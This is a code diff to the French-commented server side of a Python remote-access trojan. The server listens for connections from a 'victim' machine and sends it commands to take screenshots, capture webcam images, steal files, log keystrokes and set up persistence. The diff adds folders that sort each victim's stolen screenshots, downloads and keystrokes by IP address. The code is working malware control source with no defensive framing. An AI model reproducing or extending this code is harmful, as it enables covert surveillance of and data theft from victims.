@@ -3,6 +3,7 @@
 import socket
 import json
 import os
+import time
 
 # Create a global variable for the socket and client connection
 s = None
@@ -10,7 +11,20 @@ target = None
 ip = None
 reper = os.getcwd()
 
+desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+base_dir = os.path.join(desktop_path, "Clients")  # Dossier racine sur le bureau
 
+
+def create_client_folder(client_ip):
+    """
+    Crée un dossier pour le client basé sur son adresse IP.
+    """
+    client_folder = os.path.join(base_dir, client_ip)
+    if not os.path.exists(client_folder):
+        os.makedirs(os.path.join(client_folder, "screenshots"), exist_ok=True)
+        os.makedirs(os.path.join(client_folder, "downloads"), exist_ok=True)
+        os.makedirs(os.path.join(client_folder, "keylogger"), exist_ok=True)
+    return client_folder
 #la fonction pour etablire la connexion avec la machine vicitme
 def connection():
     global s, target, ip
@@ -22,7 +36,7 @@ def connection():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     # Bind the socket to an IP address and port
-    s.bind(("192.168.100.9", 443))
+    s.bind(("192.168.1.34", 443))
 
     # Start listening for incoming connections
     s.listen(5)
@@ -31,7 +45,7 @@ def connection():
     # Accept an incoming connection
     target, ip = s.accept()
     print(f"Connected to {ip}")
-
+    create_client_folder(ip[0]) #creer un dossier pour le client
 
 #la fonction qui vas fair l'envoi des commandes vers la machine de la vicitme
 def sending(command):
@@ -58,6 +72,7 @@ def receive():
 def shell():
     global reper
     try:
+        client_folder = create_client_folder(ip[0])  # Dossier du client connecté
         while True:
             #un simple affichage 
             command = input(f"* Shell#{ip} ==> : ")
@@ -94,7 +109,7 @@ def shell():
                             print("No screenshot data received.")
                             continue
                         # Chemin de sauvegarde
-                        screenshot_path = os.path.join("C:\\Users\\HP\\OneDrive\\Desktop", f"{ip}_ScreenShot.png")
+                        screenshot_path = os.path.join(client_folder ,"screenshots", f"{ip}_ScreenShot.png")
                         with open(screenshot_path, "wb") as f:
                             f.write(bytes.fromhex(screenshot_data))
                         print(f"Screenshot saved successfully at {screenshot_path}.")
@@ -111,18 +126,17 @@ def shell():
                 response = receive()
 
                 # Chemin de stockage
-                save_dir = r"C:\Users\HP\Downloads"
 
                 if response.get("status") == "success":
                     # Extraire le nom du fichier demandé
                     filename = os.path.basename(command[9:].strip())
-                    filepath = os.path.join(save_dir, filename)
+                    filepath = os.path.join(client_folder,"downloads", filename)
 
                 # Sauvegarder le fichier directement dans le répertoire Downloads
                     with open(filepath, "wb") as f:
                         f.write(bytes.fromhex(response["data"]))
         
-                    print(f"File azz downloaded successfully: {filepath}")
+                    print(f"File downloaded successfully: {filepath}")
                 else:
                     print(f"Error downloading file: {response.get('message')}")
                 continue
@@ -158,18 +172,29 @@ def shell():
                     print(f"Error uploading file: {str(e)}")
                 continue
             
-            elif command.strip() == "camera":
-                sending(command)  # Send the camera command to the client
-                response = receive()  # Receive the status message from the client
+            if command.strip() == "camera":
+                sending(command)  # Envoyer la commande au client
+                response = receive()  # Recevoir la réponse du client
                 if isinstance(response, dict) and response.get("status") == "success":
+                    # Récupérer les données de l'image
                     image_data = bytes.fromhex(response.get("data"))
-                    image_path = "Victime_image.png"
-                    with open("C:\\Users\\HP\\OneDrive\\Desktop\\Victime_image.png", "wb") as f:
+        
+                    # Chemin de sauvegarde dans le dossier du client
+                    image_folder = os.path.join(client_folder, "screenshots")
+                    os.makedirs(image_folder, exist_ok=True)  # S'assurer que le dossier existe
+
+                    # Nommer le fichier en fonction de l'heure pour éviter les conflits
+                    image_path = os.path.join(image_folder, f"camera_image_{time.strftime('%Y%m%d_%H%M%S')}.png")
+        
+                    # Enregistrer l'image capturée
+                    with open(image_path, "wb") as f:
                         f.write(image_data)
-                    print(f"Image successfully saved as {image_path}.")
+
+                    print(f"Image successfully saved at: {image_path}")
                 else:
                     print(f"Failed to capture image: {response}")
                 continue
+
             
             elif command.strip() == "keylogger start":
                 # Envoi de la commande pour démarrer l'enregistrement des touches
@@ -179,18 +204,15 @@ def shell():
                 continue
             
             elif command.strip() == "keylogger stop":
-                sending(command)  # Envoyer la commande pour arrêter le keylogger
-                response = receive()  # Réponse du client avec les données du fichier
-                if isinstance(response, dict) and response.get("status") == "success":
-                # Décoder les données hexadécimales et sauvegarder le fichier
-                    file_data = bytes.fromhex(response.get("data"))
-                    file_path = os.path.join(os.path.expanduser("~"), "Desktop", "keystrokes_received.txt")
-                    with open(file_path, "wb") as f:
-                        f.write(file_data)
-                    print(f"Keystrokes file saved at: {file_path}")
+                sending(command)
+                response = receive()
+                if response.get("status") == "success":
+                    keystrokes_path = os.path.join(client_folder, "keylogger", "keystrokes.txt")
+                    with open(keystrokes_path, "wb") as f:
+                        f.write(bytes.fromhex(response["data"]))
+                    print(f"Keystrokes file saved at: {keystrokes_path}")
                 else:
                     print(f"Failed to receive keystrokes file: {response.get('message')}")
-                    continue
             
             # Code côté serveur pour envoyer la commande persistance
             elif command.strip() == "persistance":
